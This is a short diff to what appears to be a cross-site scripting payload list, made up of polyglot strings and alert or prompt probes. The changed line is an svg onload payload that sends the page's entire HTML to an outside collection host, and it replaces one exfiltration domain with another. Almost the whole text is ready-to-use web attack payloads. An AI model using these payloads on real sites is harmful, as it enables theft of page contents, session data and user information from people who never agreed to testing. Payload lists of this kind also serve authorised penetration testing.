@@ -19,7 +19,7 @@
 '-setTimeout`prompt\u0028document.domain\u0029`-'
 -setTimeout`prompt\u0028document.domain\u0029`-
 %0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
-<svg/onload="(new Image()).src='//infoseguranca.com.br/'%2Bdocument.documentElement.innerHTML">
+<svg/onload="(new Image()).src='//v8.xss.ht/'%2Bdocument.documentElement.innerHTML">
 onload=alert(document.domain)
 javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 "'><img src=x onerror=alert(1)>
